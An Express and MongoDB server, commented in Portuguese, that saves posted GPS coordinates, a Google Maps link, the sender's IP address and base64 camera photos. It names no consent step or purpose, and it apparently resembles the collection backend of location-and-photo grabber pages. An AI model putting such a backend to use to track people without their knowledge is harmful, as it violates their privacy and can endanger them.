const express = require("express");
const bodyParser = require("body-parser");
const cors = require("cors");
const mongoose = require("mongoose");
require("dotenv").config();

const app = express();

const mongoURI = process.env.MONGO_URI;
mongoose.connect(mongoURI, {
  useNewUrlParser: true,
  useUnifiedTopology: true,
});

mongoose.connection
  .once("open", () => {
    console.log("Conectado ao MongoDB Atlas!");
  })
  .on("error", (error) => {
    console.log("Erro de conexão:", error);
  });

app.use(cors());
app.use(bodyParser.json({ limit: "10mb" }));

const Localizacao = require("./models/Localizacao");
const Foto = require("./models/Foto");

const salvarLocalizacao = (latitude, longitude, googleMapsLink, userIp) => {
  const timestamp = new Date().toISOString().replace(/[:.]/g, "-");

  const novaLocalizacao = new Localizacao({
    latitude,
    longitude,
    googleMapsLink,
    timestamp,
    userIp,
  });

  return novaLocalizacao
    .save()
    .then((savedLocalizacao) => savedLocalizacao)
    .catch((err) => {
      console.error("Erro ao salvar a localização no MongoDB:", err);
      throw err;
    });
};

const salvarFoto = (foto) => {
  const timestamp = new Date().toISOString().replace(/[:.]/g, "-");

  const novaFoto = new Foto({
    fotoBase64: foto,
    timestamp,
  });

  return novaFoto
    .save()
    .then((savedFoto) => savedFoto)
    .catch((err) => {
      console.error("Erro ao salvar a foto no MongoDB:", err);
      throw err;
    });
};

app.post("/salvar-localizacao", (req, res) => {
  console.log("\n=========== Nova requisição (Local) ===========");

  const { latitude, longitude, googleMapsLink } = req.body;
  const userIp = req.headers["x-forwarded-for"] || req.connection.remoteAddress;

  salvarLocalizacao(latitude, longitude, googleMapsLink, userIp)
    .then((localizacao) => {
      res.json({ message: "Localização salva com sucesso!", localizacao });
    })
    .catch((error) => {
      res.status(500).json({ message: "Erro ao salvar a localização" });
    });
});

app.post("/enviar-foto", (req, res) => {
  console.log("\n=========== Nova requisição (Foto) ===========");

  const { foto } = req.body;

  salvarFoto(foto)
    .then((foto) => {
      res.json({ message: "Foto salva com sucesso!", foto });
    })
    .catch((error) => {
      res.status(500).json({ message: "Erro ao salvar a foto" });
    });
});

const PORT = 3000;
app.listen(PORT, () => {
  console.log(`Servidor rodando na porta ${PORT}`);
});
